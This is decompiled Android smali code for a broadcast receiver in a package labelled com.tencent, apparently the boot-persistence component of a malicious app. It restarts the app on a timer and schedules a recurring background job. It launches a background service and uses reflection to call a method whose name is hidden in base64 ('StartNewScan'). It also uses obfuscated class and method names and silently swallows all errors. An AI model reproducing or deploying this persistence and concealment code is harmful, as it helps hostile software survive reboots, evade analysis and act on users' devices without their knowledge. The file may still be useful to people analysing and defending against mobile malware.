.class public Lcom/tencent/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "tunesxconcerningn101.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 15
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method

.method private restartApp(Landroid/content/Context;)V
    .locals 7

    .line 36
    :try_start_0
    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    const/high16 v1, 0x40000000    # 2.0f

    const/4 v2, 0x0

    .line 37
    invoke-static {p1, v2, v0, v1}, Landroid/app/PendingIntent;->getActivity(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v0

    const-string v1, "alarm"

    .line 38
    invoke-virtual {p1, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/app/AlarmManager;

    .line 41
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v3

    const-wide/16 v5, 0x1388

    add-long/2addr v3, v5

    invoke-virtual {p1, v2, v3, v4, v0}, Landroid/app/AlarmManager;->setExactAndAllowWhileIdle(IJLandroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static scheduleJob(Landroid/content/Context;)V
    .locals 4

    const-string v0, "jobscheduler"

    .line 18
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/job/JobScheduler;

    .line 19
    new-instance v1, Landroid/content/ComponentName;

    const-class v2, Lcom/tencent/PersistentJobService;

    invoke-direct {v1, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 21
    sget p0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x18

    const/16 v3, 0x64

    if-lt p0, v2, :cond_0

    .line 23
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/32 v1, 0xdbba0

    .line 24
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 25
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    goto :goto_0

    .line 27
    :cond_0
    new-instance p0, Landroid/app/job/JobInfo$Builder;

    invoke-direct {p0, v3, v1}, Landroid/app/job/JobInfo$Builder;-><init>(ILandroid/content/ComponentName;)V

    const-wide/16 v1, 0x3a98

    .line 28
    invoke-virtual {p0, v1, v2}, Landroid/app/job/JobInfo$Builder;->setPeriodic(J)Landroid/app/job/JobInfo$Builder;

    move-result-object p0

    .line 29
    invoke-virtual {p0}, Landroid/app/job/JobInfo$Builder;->build()Landroid/app/job/JobInfo;

    move-result-object p0

    .line 31
    :goto_0
    invoke-virtual {v0, p0}, Landroid/app/job/JobScheduler;->schedule(Landroid/app/job/JobInfo;)I

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 8

    .line 55
    :try_start_0
    sget-object p2, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    if-nez p2, :cond_0

    .line 57
    sput-object p1, Lcom/tencent/MainBackgroundService;->app_tunesxconcerningn1011_Context:Landroid/content/Context;

    .line 59
    :cond_0
    invoke-direct {p0, p1}, Lcom/tencent/BootReceiver;->restartApp(Landroid/content/Context;)V

    .line 60
    invoke-static {p1}, Lcom/tencent/BootReceiver;->scheduleJob(Landroid/content/Context;)V

    .line 61
    const-class p2, Lcom/tencent/MainBackgroundService;

    invoke-static {p2, p1}, Lcom/tencent/BackgroundServiceHelper;->removedqtractort40(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p2

    if-eqz p2, :cond_1

    .line 62
    new-instance p2, Landroid/content/Intent;

    const-class v0, Lcom/tencent/MainBackgroundService;

    invoke-direct {p2, p1, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "com.tencent.tunesxconcerningn103"
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_3

    const/4 v1, 0x0

    .line 68
    :try_start_1
    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3

    goto :goto_0

    :catch_0
    move-object v0, v1

    .line 76
    :goto_0
    :try_start_2
    invoke-virtual {v0}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v2
    :try_end_2
    .catch Ljava/lang/IllegalAccessException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/InstantiationException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_3

    goto :goto_1

    :catch_1
    move-object v2, v1

    :goto_1
    const/4 v3, 0x2

    :try_start_3
    new-array v4, v3, [Ljava/lang/Class;

    .line 84
    const-class v5, Landroid/content/Context;

    const/4 v6, 0x0

    aput-object v5, v4, v6

    .line 85
    const-class v5, Landroid/content/Intent;

    const/4 v7, 0x1

    aput-object v5, v4, v7

    const-string v5, "U3RhcnROZXdTY2Fu"

    .line 86
    invoke-static {v5}, Lcom/tencent/DataPackagingEngine;->grhcriticismzfailedd31(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    .line 90
    :try_start_4
    invoke-virtual {v0, v5, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v1
    :try_end_4
    .catch Ljava/lang/NoSuchMethodException; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_3

    :catch_2
    :try_start_5
    new-array v0, v3, [Ljava/lang/Object;

    aput-object p1, v0, v6

    aput-object p2, v0, v7

    .line 96
    invoke-virtual {v1, v2, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_5
    .catch Ljava/lang/IllegalAccessException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3

    :catch_3
    :cond_1
    return-void
.end method
